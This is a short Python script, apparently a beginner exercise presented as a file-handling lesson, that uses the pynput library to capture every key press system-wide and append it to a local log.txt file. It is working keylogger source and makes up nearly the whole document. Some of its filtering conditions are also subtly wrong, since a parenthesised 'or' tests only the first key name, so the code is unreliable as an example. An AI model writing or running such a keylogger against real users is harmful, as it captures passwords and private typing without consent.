# Storing the keystrokes in a text file.
# File handaling - How to read append to a file.

# r - reading 
# w - writing
# a - appending
from pynput.keyboard import Listener
# from pynput.keyboard import Controller

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")  # Replace the ' with the blank space

    if letter == 'Key.space':  # remove the space key_code with actual space
        letter = ' '
    if letter == ('Key.shift_r' or 'Key.shift'):
        letter = ''
    if letter == 'Key.backspace':
        letter = ''
    if letter == ('Key.ctrl_l' or 'Key.ctrl_r'):
        letter = ''
    if letter == 'Key.enter':
        letter = '\n'
    with open("log.txt", 'a') as f:
        f.write(letter)

# pynput --> library for controlling input streams
"""
Things you can do with pynput:
    Listen and crontrol your mouse and keybord
"""

with Listener(on_press = write_to_file) as l:
    l.join()



